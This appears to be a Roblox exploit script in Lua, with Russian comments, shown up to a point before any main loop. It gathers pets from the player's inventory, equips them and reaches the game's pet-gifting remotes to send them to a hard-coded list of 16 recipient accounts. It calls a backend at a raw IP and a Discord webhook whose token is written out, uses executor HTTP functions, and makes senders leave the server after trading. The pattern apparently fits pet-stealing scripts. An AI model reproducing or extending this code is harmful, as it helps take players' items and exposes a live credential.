-- =========================
-- Конфигурация
-- =========================
local __getgenv_from_global = rawget(_G, "getgenv")
local getgenv = __getgenv_from_global or function()
    _G.__GENV = _G.__GENV or {}
    return _G.__GENV
end

getgenv().Config = {
    Recipients = {
        "Sienasees2679",
        "Gamstoni12195",
        "Stutecrisi37076",
        "Gobahbatha49885",
        "Cuayabraho52063",
        "Rulzyerra845",
        "Sitchlinh683",
        "Ohorovince98806",
        "Sainskasie03919",
        "Bethonie466",
        "Boiddzul6288",
        "Trumgoddu6900",
        "Velnotch7879",
        "Durlilek61981",
        "Junckponto4756",
        "Barbetrefz29367",
    },
    PetsToTrade = {
        "French Fry Ferret",
        "Lobster Thermidor",
        "Capybara",
        "Nihonzaru",
    },
    RecipientPetMap = {
        ["Sienasees2679"] = {"Lobster Thermidor"},
        ["Gamstoni12195"] = {"Lobster Thermidor"},
        ["Stutecrisi37076"] = {"Lobster Thermidor"},
        ["Gobahbatha49885"] = {"Lobster Thermidor"},
        ["Cuayabraho52063"] = {"French Fry Ferret"},
        ["Rulzyerra845"] = {"French Fry Ferret"},
        ["Sitchlinh683"] = {"French Fry Ferret"},
        ["Ohorovince98806"] = {"French Fry Ferret"},
        ["Sainskasie03919"] = {"Capybara"},
        ["Bethonie466"] = {"Capybara"},
        ["Boiddzul6288"] = {"Capybara"},
        ["Trumgoddu6900"] = {"Capybara"},
        ["Velnotch7879"] = {"Nihonzaru"},
        ["Durlilek61981"] = {"Nihonzaru"},
        ["Junckponto4756"] = {"Nihonzaru"},
        ["Barbetrefz29367"] = {"Nihonzaru"},
    },
    Enabled = true,
    BackendURL = "http://45.150.128.26:8000",
    UseBackend = true,
    AutoTeleport = true,
    SkipTeleportIfNoPets = true,
    LeaveServerAfterTrade = true,
    DiscordWebhook = "https://discord.com/api/webhooks/1405625962657480815/BMlUrUwfIWNqvBCjn_aAGjYzr0Pmls3K8jaI32YbrAZreumG10S-x3FNN-9ulviO-1zi",
    DiscordNotifications = true,
    -- Умный поиск серверов для реципиентов
    SmartServerSearch = true,
    MinFreeSlots = 2, -- минимальное количество свободных слотов на сервере
    PreferLowerPopulation = true, -- отдавать предпочтение менее заполненным серверам
    ServerScanPages = 3, -- сколько страниц API просматривать (по 100 серверов на страницу)
    AvoidNearlyFullThreshold = 0.9 -- избегать серверов, заполненных на 90% и более
}

local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local LocalPlayer = Players.LocalPlayer
local HttpService = game:GetService("HttpService")
local TeleportService = game:GetService("TeleportService")

local ScreenGui = Instance.new("ScreenGui")
ScreenGui.Name = "AutoTradeGUI"
ScreenGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")

local Frame = Instance.new("Frame")
Frame.Name = "MainFrame"
Frame.Size = UDim2.new(0, 350, 0, 250)
Frame.Position = UDim2.new(0, 10, 0, 10)
Frame.BackgroundColor3 = Color3.fromRGB(30, 30, 30)
Frame.BorderSizePixel = 0
Frame.Parent = ScreenGui

local UICorner = Instance.new("UICorner")
UICorner.CornerRadius = UDim.new(0, 8)
UICorner.Parent = Frame

local Title = Instance.new("TextLabel")
Title.Name = "Title"
Title.Size = UDim2.new(1, 0, 0, 35)
Title.Position = UDim2.new(0, 0, 0, 0)
Title.BackgroundColor3 = Color3.fromRGB(45, 45, 45)
Title.TextColor3 = Color3.fromRGB(255, 255, 255)
Title.Text = "Auto Trade Status"
Title.TextScaled = true
Title.Font = Enum.Font.GothamBold
Title.Parent = Frame

local UICorner2 = Instance.new("UICorner")
UICorner2.CornerRadius = UDim.new(0, 8)
UICorner2.Parent = Title

local CopyButton = Instance.new("TextButton")
CopyButton.Name = "CopyButton"
CopyButton.Size = UDim2.new(0, 80, 0, 25)
CopyButton.Position = UDim2.new(1, -170, 0, 5)
CopyButton.BackgroundColor3 = Color3.fromRGB(0, 120, 255)
CopyButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CopyButton.Text = "Copy All"
CopyButton.TextScaled = true
CopyButton.Font = Enum.Font.GothamBold
CopyButton.Parent = Title

local UICorner4 = Instance.new("UICorner")
UICorner4.CornerRadius = UDim.new(0, 4)
UICorner4.Parent = CopyButton

local CloseButton = Instance.new("TextButton")
CloseButton.Name = "CloseButton"
CloseButton.Size = UDim2.new(0, 80, 0, 25)
CloseButton.Position = UDim2.new(1, -85, 0, 5)
CloseButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
CloseButton.TextColor3 = Color3.fromRGB(255, 255, 255)
CloseButton.Text = "Close"
CloseButton.TextScaled = true
CloseButton.Font = Enum.Font.GothamBold
CloseButton.Parent = Title

local UICorner5 = Instance.new("UICorner")
UICorner5.CornerRadius = UDim.new(0, 4)
UICorner5.Parent = CloseButton

local ScrollingFrame = Instance.new("ScrollingFrame")
ScrollingFrame.Name = "LogFrame"
ScrollingFrame.Size = UDim2.new(1, -10, 1, -50)
ScrollingFrame.Position = UDim2.new(0, 5, 0, 40)
ScrollingFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
ScrollingFrame.BorderSizePixel = 0
ScrollingFrame.ScrollBarThickness = 6
ScrollingFrame.Parent = Frame

local UICorner3 = Instance.new("UICorner")
UICorner3.CornerRadius = UDim.new(0, 6)
UICorner3.Parent = ScrollingFrame

local UIListLayout = Instance.new("UIListLayout")
UIListLayout.Parent = ScrollingFrame
UIListLayout.Padding = UDim.new(0, 2)
UIListLayout.SortOrder = Enum.SortOrder.LayoutOrder

local allMessages = {}

local function AddMessage(message, messageType)
    messageType = messageType or "info"
    
    local colors = {
        info = Color3.fromRGB(255, 255, 255),
        success = Color3.fromRGB(0, 255, 0),
        warning = Color3.fromRGB(255, 255, 0),
        error = Color3.fromRGB(255, 0, 0)
    }
    
    table.insert(allMessages, message)
    
    local TextLabel = Instance.new("TextLabel")
    TextLabel.Size = UDim2.new(1, 0, 0, 20)
    TextLabel.BackgroundTransparency = 1
    TextLabel.TextColor3 = colors[messageType] or colors.info
    TextLabel.Text = message
    TextLabel.TextScaled = true
    TextLabel.Font = Enum.Font.Gotham
    TextLabel.TextXAlignment = Enum.TextXAlignment.Left
    TextLabel.Parent = ScrollingFrame
    
    local children = ScrollingFrame:GetChildren()
    if #children > 50 then
        children[1]:Destroy()
    end
    
    ScrollingFrame.CanvasPosition = Vector2.new(0, ScrollingFrame.CanvasSize.Y.Offset)
end

setclipboard = setclipboard

local function CopyAllMessages()
    local clipboard = table.concat(allMessages, "\n")
    
    if setclipboard then
        setclipboard(clipboard)
        AddMessage("Все сообщения скопированы в буфер обмена!", "success")
    else
        local clipboardGui = Instance.new("ScreenGui")
        clipboardGui.Name = "ClipboardGui"
        clipboardGui.Parent = game.Players.LocalPlayer:WaitForChild("PlayerGui")
        
        local clipboardFrame = Instance.new("Frame")
        clipboardFrame.Size = UDim2.new(0, 400, 0, 300)
        clipboardFrame.Position = UDim2.new(0.5, -200, 0.5, -150)
        clipboardFrame.BackgroundColor3 = Color3.fromRGB(40, 40, 40)
        clipboardFrame.BorderSizePixel = 0
        clipboardFrame.Parent = clipboardGui
        
        local UICorner5 = Instance.new("UICorner")
        UICorner5.CornerRadius = UDim.new(0, 8)
        UICorner5.Parent = clipboardFrame
        
        local clipboardTitle = Instance.new("TextLabel")
        clipboardTitle.Size = UDim2.new(1, 0, 0, 30)
        clipboardTitle.BackgroundColor3 = Color3.fromRGB(60, 60, 60)
        clipboardTitle.TextColor3 = Color3.fromRGB(255, 255, 255)
        clipboardTitle.Text = "Скопированные сообщения"
        clipboardTitle.TextScaled = true
        clipboardTitle.Font = Enum.Font.GothamBold
        clipboardTitle.Parent = clipboardFrame
        
        local clipboardTextBox = Instance.new("TextBox")
        clipboardTextBox.Size = UDim2.new(1, -20, 1, -40)
        clipboardTextBox.Position = UDim2.new(0, 10, 0, 35)
        clipboardTextBox.BackgroundColor3 = Color3.fromRGB(20, 20, 20)
        clipboardTextBox.TextColor3 = Color3.fromRGB(255, 255, 255)
        clipboardTextBox.Text = clipboard
        clipboardTextBox.TextXAlignment = Enum.TextXAlignment.Left
        clipboardTextBox.TextYAlignment = Enum.TextYAlignment.Top
        clipboardTextBox.TextWrapped = true
        clipboardTextBox.Font = Enum.Font.Gotham
        clipboardTextBox.Parent = clipboardFrame
        
        local closeButton = Instance.new("TextButton")
        closeButton.Size = UDim2.new(0, 80, 0, 25)
        closeButton.Position = UDim2.new(0.5, -40, 1, -30)
        closeButton.BackgroundColor3 = Color3.fromRGB(255, 0, 0)
        closeButton.TextColor3 = Color3.fromRGB(255, 255, 255)
        closeButton.Text = "Закрыть"
        closeButton.TextScaled = true
        closeButton.Font = Enum.Font.GothamBold
        closeButton.Parent = clipboardFrame
        
        closeButton.MouseButton1Click:Connect(function()
            clipboardGui:Destroy()
        end)
        
        AddMessage("Сообщения показаны в окне. Скопируйте текст вручную.", "info")
    end
end

CopyButton.MouseButton1Click:Connect(CopyAllMessages)

CloseButton.MouseButton1Click:Connect(function()
    ScreenGui:Destroy()
    AddMessage("UI закрыт. Скрипт продолжает работать в фоне.", "info")
end)

local PetGiftingService = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("PetGiftingService")
local AcceptPetGift = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("AcceptPetGift")
local GiftPet = ReplicatedStorage:WaitForChild("GameEvents"):WaitForChild("GiftPet")

local function GetPetData(tool)
    if not tool or not tool:IsA("Tool") then
        return nil
    end
    
    -- Проверяем корректность имени
    if not tool.Name or tool.Name == "" then
        return nil
    end
    
    local petUUID = tool:GetAttribute("PET_UUID")
    if not petUUID or petUUID == "" then
        return nil
    end
    
    -- Проверяем, что Tool все еще существует
    if not tool.Parent then
        return nil
    end
    
    return {
        Name = tool.Name,
        UUID = petUUID,
        Tool = tool
    }
end

local function GetFullInventory()
    local inventory = {}
    local character = LocalPlayer.Character
    
    if not character then
        return inventory
    end
    
    -- Ищем предметы в персонаже (в руках)
    for _, item in pairs(character:GetChildren()) do
        if item:IsA("Tool") then
            table.insert(inventory, item)
        end
    end
    
    -- Ищем предметы в рюкзаке
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack then
        for _, item in pairs(backpack:GetChildren()) do
            if item:IsA("Tool") then
                table.insert(inventory, item)
            end
        end
    end
    
    return inventory
end

-- Функция для поиска питомцев в инвентаре
local function GetPetsInInventory()
    local pets = {}
    local character = LocalPlayer.Character
    
    if not character then
        return pets
    end
    
    -- Проверяем корректность персонажа
    if not character:IsA("Model") then
        return pets
    end
    
    -- Ищем питомцев в персонаже (в руках)
    for _, item in pairs(character:GetChildren()) do
        if item and item:IsA("Tool") then
            local petUUID = item:GetAttribute("PET_UUID")
            if petUUID and petUUID ~= "" then
                local petData = GetPetData(item)
                if petData then
                    table.insert(pets, petData)
                end
            end
        end
    end
    
    -- Ищем питомцев в рюкзаке
    local backpack = LocalPlayer:FindFirstChild("Backpack")
    if backpack and backpack:IsA("Backpack") then
        for _, item in pairs(backpack:GetChildren()) do
            if item and item:IsA("Tool") then
                local petUUID = item:GetAttribute("PET_UUID")
                if petUUID and petUUID ~= "" then
                    local petData = GetPetData(item)
                    if petData then
                        table.insert(pets, petData)
                    end
                end
            end
        end
    end
    
    return pets
end

-- Функция для взятия питомца в руки
local function EquipPet(petData)
    if not petData or not petData.Tool then
        return false
    end
    
    local character = LocalPlayer.Character
    if not character then
        return false
    end
    
    -- Проверяем, не держим ли уже этот питомец
    local currentTool = character:FindFirstChildWhichIsA("Tool")
    if currentTool and currentTool == petData.Tool then
        return true -- Уже держим нужного питомца
    end
    
    -- Берем питомца в руки
    if petData.Tool.Parent == LocalPlayer.Backpack then
        petData.Tool.Parent = character
        AddMessage("Взял в руки питомца: " .. petData.Name, "info")
    else
        AddMessage("Питомец уже в руках: " .. petData.Name, "info")
    end
    
    return true
end

-- Функция для извлечения основного имени питомца (без веса и возраста)
local function GetBasePetName(fullPetName)
    -- Проверяем корректность входных данных
    if not fullPetName or type(fullPetName) ~= "string" then
        return ""
    end
    
    -- Убираем информацию о весе и возрасте
    local baseName = fullPetName:match("^([^%[]+)")
    if baseName then
        return baseName:gsub("%s+$", "") -- Убираем пробелы в конце
    end
    return fullPetName
end

-- Функция для проверки, является ли питомец в списке для трейда
local function IsPetInTradeList(petName)
    -- Проверяем корректность входных данных
    if not petName or type(petName) ~= "string" then
        return false
    end
    
    local basePetName = GetBasePetName(petName)
    if basePetName == "" then
        return false
    end
    
    -- Проверяем, что список питомцев для трейда существует
    local petsToTrade = getgenv().Config.PetsToTrade
    if not petsToTrade or type(petsToTrade) ~= "table" then
        return false
    end
    
    for _, pet in pairs(petsToTrade) do
        if pet and type(pet) == "string" and pet == basePetName then
            return true
        end
    end
    return false
end

-- Построение обратной мапы питомец -> множество получателей
local function BuildPetToRecipientsMap()
    local map = {}
    local prefs = getgenv().Config.RecipientPetMap or {}
    
    -- Проверяем корректность настроек
    if type(prefs) ~= "table" then
        return map
    end
    
    for username, petList in pairs(prefs) do
        if username and type(username) == "string" and username ~= "" then
            if type(petList) == "string" then
                petList = {petList}
            end
            
            if type(petList) == "table" then
                for _, name in pairs(petList) do
                    if name and type(name) == "string" and name ~= "" then
                        local base = GetBasePetName(name)
                        if base ~= "" then
                            map[base] = map[base] or {}
                            map[base][username] = true
                        end
                    end
                end
            end
        end
    end
    return map
end

-- Разрешен ли питомец для конкретного получателя согласно маппингу
local function IsPetAllowedForRecipient(petName, recipient, petToRecipients)
    -- Проверяем корректность входных данных
    if not petName or type(petName) ~= "string" or not recipient or type(recipient) ~= "string" then
        return true -- По умолчанию разрешаем
    end
    
    if not petToRecipients or type(petToRecipients) ~= "table" then
        return true -- По умолчанию разрешаем
    end
    
    local base = GetBasePetName(petName)
    if base == "" then
        return true -- По умолчанию разрешаем
    end
    
    if petToRecipients[base] and type(petToRecipients[base]) == "table" then
        return petToRecipients[base][recipient] == true
    end
    return true
end

-- Есть ли в инвентаре питомцы, подходящие под маппинг для получателя
local function HasPetsForRecipient(recipient)
    -- Проверяем корректность входных данных
    if not recipient or type(recipient) ~= "string" or recipient == "" then
        return false
    end
    
    local petToRecipients = BuildPetToRecipientsMap()
    local pets = GetPetsInInventory()
    
    -- Проверяем корректность списка питомцев
    if not pets or type(pets) ~= "table" then
        return false
    end
    
    for _, petData in pairs(pets) do
        if petData and petData.Name and type(petData.Name) == "string" then
            if IsPetInTradeList(petData.Name) and IsPetAllowedForRecipient(petData.Name, recipient, petToRecipients) then
                return true
            end
        end
    end
    return false
end

-- Функция для HTTP запросов к бекенду
local function MakeHttpRequest(url, method, data)
    -- Пытаемся использовать эксплойтные HTTP при наличии, иначе HttpService
    local synLib = rawget(getgenv() or _G, "syn")
    local req = (synLib and synLib.request)
        or rawget(getgenv() or _G, "http_request")
        or rawget(getgenv() or _G, "request")
    
    -- Отладочная информация о доступных методах (только при первом вызове)
    if not getgenv().HTTPMethodLogged then
        if synLib and synLib.request then
            AddMessage("HTTP: используется syn.request", "info")
        elseif rawget(getgenv() or _G, "http_request") then
            AddMessage("HTTP: используется http_request", "info")
        elseif rawget(getgenv() or _G, "request") then
            AddMessage("HTTP: используется request", "info")
        else
            AddMessage("HTTP: эксплойтные методы недоступны, только HttpService fallback для внутренних ресурсов", "warning")
        end
        getgenv().HTTPMethodLogged = true
    end
    
    local function makeRequest(options)
        if type(req) == "function" then
            local ok, res = pcall(req, options)
            if ok and res then 
                return true, tonumber(res.StatusCode) or tonumber(res.Status) or 0, res.Body or ""
            end
            return false, 0, tostring(res)
        end
        
        -- HttpService fallback отключен для внешних API
        -- Roblox не позволяет HttpService обращаться к внешним ресурсам
        if url:find("games.roblox.com") or url:find("http") then
            AddMessage("HTTP: эксплойтные методы недоступны, HttpService fallback отключен для внешних API", "warning")
            return false, 0, "HttpService fallback отключен для внешних API"
        end
        
        -- HttpService fallback только для внутренних ресурсов Roblox
        local ok, res = pcall(function()
            return HttpService:RequestAsync({
                Url = options.Url,
                Method = options.Method or "GET",
                Headers = options.Headers or {},
                Body = options.Body,
            })
        end)
        if ok and res then
            return true, tonumber(res.StatusCode) or 0, res.Body or ""
        end
        return false, 0, tostring(res)
    end
    
    local options = {
        Url = url,
        Method = method or "GET"
    }
    
    if method == "POST" and data then
        options.Headers = { ["Content-Type"] = "application/json" }
        options.Body = HttpService:JSONEncode(data)
    end
    
    local success, statusCode, body = makeRequest(options)
    
    if not success then
        AddMessage("Ошибка HTTP запроса: " .. tostring(body), "error")
        return nil
    end
    
    if statusCode ~= 200 then
        AddMessage("HTTP ошибка: статус " .. tostring(statusCode), "error")
        -- Для Roblox API добавляем дополнительную информацию
        if url:find("games.roblox.com") then
            AddMessage("Roblox API может быть временно недоступен или ограничен", "warning")
        end
        return nil
    end
    
    if not body or body == "" then
        AddMessage("Пустой ответ от сервера", "warning")
        return nil
    end
    
    local success2, decoded = pcall(function()
        return HttpService:JSONDecode(body)
    end)
    
    if not success2 then
        AddMessage("Ошибка декодирования JSON: " .. tostring(decoded), "error")
        -- Для Roblox API добавляем дополнительную информацию
        if url:find("games.roblox.com") then
            AddMessage("Roblox API вернул некорректный JSON", "warning")
        end
        return nil
    end
    
    return decoded
end

-- =====================
-- Функция для проверки, является ли сервер VIP
local function IsVipServer()
    local currentPlayers = #game.Players:GetPlayers()
    local jobId = game.JobId
    
    -- Проверяем, есть ли у нас память об этом сервере
    if not getgenv().ServerMemory then
        getgenv().ServerMemory = {}
    end
    
    -- Создаем уникальный ключ для сервера (JobId + PlaceId)
    local serverKey = tostring(game.PlaceId) .. "_" .. tostring(jobId)
    
    -- Если у нас есть память о том, что этот сервер обычный, доверяем ей
    if getgenv().ServerMemory[serverKey] and getgenv().ServerMemory[serverKey].isNormal then
        AddMessage("ServerMemory: сервер помечен как обычный, не переходим", "info")
        return false
    end
    
    -- Если на сервере больше 1 игрока, значит это обычный сервер
    if currentPlayers > 1 then
        -- Запоминаем, что этот сервер обычный
        getgenv().ServerMemory[serverKey] = {
            isNormal = true,
            timestamp = tick(),
            maxPlayersSeen = currentPlayers
        }
        AddMessage("ServerMemory: сервер помечен как обычный (игроков: " .. currentPlayers .. ")", "info")
        return false
    end
    
    -- Если мы одни на сервере, проверяем память
    if currentPlayers == 1 then
        -- Если у нас есть память о том, что на этом сервере были другие игроки, 
        -- значит это обычный сервер, с которого просто все вышли
        if getgenv().ServerMemory[serverKey] and getgenv().ServerMemory[serverKey].maxPlayersSeen > 1 then
            AddMessage("ServerMemory: сервер обычный, все игроки вышли (было: " .. getgenv().ServerMemory[serverKey].maxPlayersSeen .. ")", "info")
            return false
        end
        
        -- Если нет памяти о других игроках, проверяем другие индикаторы VIP
        local isVipByIndicators = false
        
        -- Проверка через JobId
        if jobId and (jobId:find("vip") or jobId:find("VIP") or jobId:find("private") or jobId:find("PRIVATE")) then
            isVipByIndicators = true
        end
        
        -- Проверка через TeleportService
        if not isVipByIndicators then
            local success, result = pcall(function()
                return TeleportService:GetLocalPlayerTeleportData()
            end)
            
            if success and result and (result.vip or result.VIP or result.private or result.PRIVATE) then
                isVipByIndicators = true
            end
        end
        
        -- Если сервер определен как VIP по индикаторам, запоминаем это
        if isVipByIndicators then
            getgenv().ServerMemory[serverKey] = {
                isVip = true,
                timestamp = tick(),
                reason = "VIP indicators detected"
            }
            AddMessage("ServerMemory: сервер помечен как VIP по индикаторам", "warning")
            return true
        end
        
        -- Если нет явных индикаторов VIP, но мы одни - это может быть VIP сервер
        -- Но не запоминаем, чтобы не блокировать переходы с настоящих VIP серверов
        AddMessage("ServerMemory: сервер с 1 игроком, возможен VIP (проверяем индикаторы)", "warning")
        return false
    end
    
    return false
end

-- Функция для очистки старой памяти о серверах
local function CleanupServerMemory()
    if not getgenv().ServerMemory then
        return
    end
    
    local currentTime = tick()
    local cleanedCount = 0
    
    for serverKey, serverData in pairs(getgenv().ServerMemory) do
        -- Удаляем память старше 1 часа (3600 секунд)
        if currentTime - serverData.timestamp > 3600 then
            getgenv().ServerMemory[serverKey] = nil
            cleanedCount = cleanedCount + 1
        end
    end
    
    if cleanedCount > 0 then
        AddMessage("ServerMemory: очищено " .. cleanedCount .. " старых записей", "info")
    end
end

-- Функция для проверки, полный ли сервер
local function IsServerFull()
    local maxPlayers = game.Players.MaxPlayers
    local currentPlayers = #game.Players:GetPlayers()
    
    -- Считаем сервер полным, если занято 95% мест
    local fullThreshold = math.floor(maxPlayers * 0.95)
    
    return currentPlayers >= fullThreshold
end

-- УМНЫЙ ПОИСК ПУБЛИЧНЫХ СЕРВЕРОВ
-- =====================
-- Простой fallback для перехода на публичный сервер
local function SimpleFallbackTeleport()
    local placeId = 126884695634066 -- ID игры GAG
    
    AddMessage("ServerSearch: используем простой fallback Teleport...", "info")
    
    local success, error = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId)
    end)
    
    if success then
        AddMessage("ServerSearch: простой fallback Teleport запущен", "success")
        return true
    else
        AddMessage("ServerSearch: ошибка простого fallback Teleport: " .. tostring(error), "error")
        return false
    end
end

-- Функция для поиска лучшего публичного сервера
local function FindBestPublicServer()
    local placeId = 126884695634066 -- ID игры GAG
    
    -- Проверяем корректность placeId
    if not placeId or type(placeId) ~= "number" then
        AddMessage("ServerSearch: некорректный placeId: " .. tostring(placeId), "error")
        return false
    end
    
    AddMessage("ServerSearch: поиск публичного сервера...", "info")
    
    local success, result = pcall(function()
        local Api = "https://games.roblox.com/v1/games/"
        local servers = Api .. placeId .. "/servers/Public?sortOrder=Asc&limit=100"
        
        local function ListServers(cursor)
            -- Используем эксплойтные HTTP методы для Roblox API
            local synLib = rawget(getgenv() or _G, "syn")
            local req = (synLib and synLib.request)
                or rawget(getgenv() or _G, "http_request")
                or rawget(getgenv() or _G, "request")
            
            if type(req) == "function" then
                local url = servers .. ((cursor and "&cursor=" .. cursor) or "")
                local ok, res = pcall(req, {
                    Url = url,
                    Method = "GET"
                })
                
                if ok and res and res.Body then
                    return HttpService:JSONDecode(res.Body)
                else
                    AddMessage("ServerSearch: ошибка HTTP запроса к Roblox API", "warning")
                    return nil
                end
            else
                -- Fallback на game:HttpGet если доступен
                local ok, raw = pcall(function()
                    return game:HttpGet(servers .. ((cursor and "&cursor=" .. cursor) or ""))
                end)
                
                if ok and raw then
                    return HttpService:JSONDecode(raw)
                else
                    AddMessage("ServerSearch: эксплойтные HTTP методы и game:HttpGet недоступны для Roblox API", "warning")
                    return nil
                end
            end
        end
        
        local server, nextCursor
        repeat
            local serversData = ListServers(nextCursor)
            if serversData and serversData.data and #serversData.data > 0 then
                -- Ищем сервер с наименьшим количеством игроков
                for _, srv in pairs(serversData.data) do
                    if srv and srv.id and srv.playing and srv.maxPlayers then
                        local playerCount = srv.playing
                        local maxPlayers = srv.maxPlayers
                        local fillPercentage = playerCount / maxPlayers
                        
                        -- Предпочитаем серверы с заполненностью менее 80%
                        if fillPercentage < 0.8 and playerCount < maxPlayers then
                            server = srv
                            break
                        end
                    end
                end
                
                -- Если не нашли подходящий, берем первый доступный
                if not server and serversData.data[1] then
                    server = serversData.data[1]
                end
                
                nextCursor = serversData.nextPageCursor
            else
                break
            end
        until server or not nextCursor
        
        return server
    end)
    
    if success and result and result.id then
        AddMessage("ServerSearch: найден сервер ID " .. result.id .. " (игроков: " .. (result.playing or 0) .. "/" .. (result.maxPlayers or 0) .. ")", "success")
        
        -- Переходим на найденный сервер
        local teleportSuccess, teleportError = pcall(function()
            TeleportService:TeleportToPlaceInstance(placeId, result.id)
        end)
        
        if teleportSuccess then
            AddMessage("ServerSearch: переход на сервер " .. result.id .. " запущен", "success")
            return true
        else
            AddMessage("ServerSearch: ошибка перехода: " .. tostring(teleportError), "error")
            return false
        end
    else
        AddMessage("ServerSearch: не удалось найти подходящий сервер", "error")
        if not success then
            AddMessage("ServerSearch: ошибка поиска: " .. tostring(result), "error")
        end
        
        -- Пробуем простой fallback
        AddMessage("ServerSearch: пробуем простой fallback...", "warning")
        return SimpleFallbackTeleport()
    end
end

-- Альтернативный метод поиска сервера с задержкой
local function AlternativeServerSearch()
    local placeId = 126884695634066 -- ID игры GAG
    
    -- Проверяем корректность placeId
    if not placeId or type(placeId) ~= "number" then
        AddMessage("ServerSearch: некорректный placeId: " .. tostring(placeId), "error")
        return false
    end
    
    AddMessage("ServerSearch: альтернативный поиск с задержкой...", "info")
    
    -- Небольшая задержка перед повторной попыткой
    task.wait(2)
    
    -- Используем альтернативный поиск серверов
    local success, result = pcall(function()
        local Api = "https://games.roblox.com/v1/games/"
        local servers = Api .. placeId .. "/servers/Public?sortOrder=Asc&limit=50"
        
        local function ListServers(cursor)
            -- Используем эксплойтные HTTP методы для Roblox API
            local synLib = rawget(getgenv() or _G, "syn")
            local req = (synLib and synLib.request)
                or rawget(getgenv() or _G, "http_request")
                or rawget(getgenv() or _G, "request")
            
            if type(req) == "function" then
                local url = servers .. ((cursor and "&cursor=" .. cursor) or "")
                local ok, res = pcall(req, {
                    Url = url,
                    Method = "GET"
                })
                
                if ok and res and res.Body then
                    return HttpService:JSONDecode(res.Body)
                else
                    AddMessage("ServerSearch: ошибка HTTP запроса к Roblox API (альтернативный)", "warning")
                    return nil
                end
            else
                -- Fallback на game:HttpGet если доступен
                local ok, raw = pcall(function()
                    return game:HttpGet(servers .. ((cursor and "&cursor=" .. cursor) or ""))
                end)
                
                if ok and raw then
                    return HttpService:JSONDecode(raw)
                else
                    AddMessage("ServerSearch: эксплойтные HTTP методы и game:HttpGet недоступны для Roblox API (альтернативный)", "warning")
                    return nil
                end
            end
        end
        
        local serversData = ListServers()
        if serversData and serversData.data and #serversData.data > 0 then
            -- Берем первый доступный сервер
            return serversData.data[1]
        end
        return nil
    end)
    
    if success and result and result.id then
        AddMessage("ServerSearch: альтернативный сервер найден ID " .. result.id, "success")
        
        -- Переходим на найденный сервер
        local teleportSuccess, teleportError = pcall(function()
            TeleportService:TeleportToPlaceInstance(placeId, result.id)
        end)
        
        if teleportSuccess then
            AddMessage("ServerSearch: альтернативный переход запущен", "success")
            return true
        else
            AddMessage("ServerSearch: ошибка альтернативного перехода: " .. tostring(teleportError), "error")
            return false
        end
    else
        AddMessage("ServerSearch: альтернативный поиск не удался", "error")
        
        -- Пробуем простой fallback
        AddMessage("ServerSearch: пробуем простой fallback для альтернативного поиска...", "warning")
        return SimpleFallbackTeleport()
    end
end

local function FindBestPublicServerWrapper(placeId)
    -- Заменяем умный поиск на поиск серверов
    if not getgenv().Config.SmartServerSearch then return nil end
    
    AddMessage("Smart search: используем поиск серверов", "info")
    return FindBestPublicServer()
end

-- Fallback функция для поиска любого доступного сервера
local function FindAnyAvailableServer(placeId)
    AddMessage("Fallback: используем поиск серверов", "info")
    return FindBestPublicServer()
end

local function TeleportReceiverWithRejoin()
    local placeId = 126884695634066
    
    -- Проверяем, не находимся ли мы уже на публичном сервере
    if not IsVipServer() and not IsServerFull() then
        AddMessage("Teleport: уже находимся на подходящем сервере", "info")
        return true
    end
    
    AddMessage("Teleport: используем умный поиск серверов для перехода...", "info")
    
    -- Сначала пробуем умный поиск серверов
    local success = FindBestPublicServer()
    
    if success then
        AddMessage("Teleport: поиск серверов выполнен успешно", "success")
        return true
    else
        AddMessage("Teleport: первый поиск не удался, пробуем альтернативный метод", "warning")
        
        -- Если первый поиск не удался, пробуем альтернативный
        local altSuccess = AlternativeServerSearch()
        
        if altSuccess then
            AddMessage("Teleport: альтернативный поиск выполнен успешно", "success")
            return true
        else
            AddMessage("Teleport: альтернативный поиск не удался, используем fallback", "warning")
            
            -- Если и альтернативный не удался, используем простой fallback
            return SimpleFallbackTeleport()
        end
    end
end

-- Функция для перехода на обычный сервер
local function RejoinNormalServer()
    local placeId = 126884695634066 -- ID игры GAG
    
    -- Проверяем, являемся ли мы получателем
    local isReceiver = false
    for _, username in pairs(getgenv().Config.Recipients) do
        if username == LocalPlayer.Name then
            isReceiver = true
            break
        end
    end
    
    -- Только получатели могут переходить на обычные серверы
    if not isReceiver then
        AddMessage("Отправители не переходят на обычные серверы (остаемся на текущем)", "info")
        return false
    end
    
    -- Защита от зацикливания
    if not getgenv().VIPRejoinAttempts then
        getgenv().VIPRejoinAttempts = 0
    end
    
    getgenv().VIPRejoinAttempts = getgenv().VIPRejoinAttempts + 1
    
    if getgenv().VIPRejoinAttempts > 3 then
        AddMessage("⚠️ ПРЕВЫШЕНО количество попыток перехода с VIP-сервера!", "error")
        AddMessage("Используем стандартный Teleport как последнее средство", "warning")
        
        -- Сброс счетчика и использование простого fallback
        getgenv().VIPRejoinAttempts = 0
        
        return SimpleFallbackTeleport()
    end
    
    AddMessage("Переход на обычный сервер (получатель)... Попытка " .. getgenv().VIPRejoinAttempts .. "/3", "info")
    
    -- Используем умный поиск серверов для перехода на публичный сервер
    if getgenv().Config.SmartServerSearch then
        AddMessage("Rejoin: используем умный поиск серверов для перехода...", "info")
        local smartOk = TeleportReceiverWithRejoin()
        if smartOk then
            -- Сброс счетчика при успешном переходе
            getgenv().VIPRejoinAttempts = 0
            AddMessage("Rejoin: переход на публичный сервер успешен", "success")
            return true
        else
            AddMessage("Rejoin: переход не удался", "warning")
            AddMessage("Rejoin: ожидание 10 секунд перед следующей попыткой...", "info")
            task.wait(10) -- Увеличенная задержка между попытками
            return false
        end
    else
        AddMessage("Rejoin: переход отключен — остаемся на текущем сервере", "warning")
        return false
    end
end

-- Функция для выхода с сервера (кик отправителя после трейда)
local function LeaveServerAfterTrade()
    local placeId = 126884695634066 -- ID игры GAG
    
    AddMessage("Отправитель: выход с сервера после трейда...", "info")
    
    local success, error = pcall(function()
        TeleportService:TeleportToPlaceInstance(placeId)
    end)
    
    if success then
        AddMessage("Выход с сервера запущен (Teleport)...", "success")
        return true
    else
        AddMessage("Ошибка выхода с сервера: " .. tostring(error), "error")
        return false
    end
end

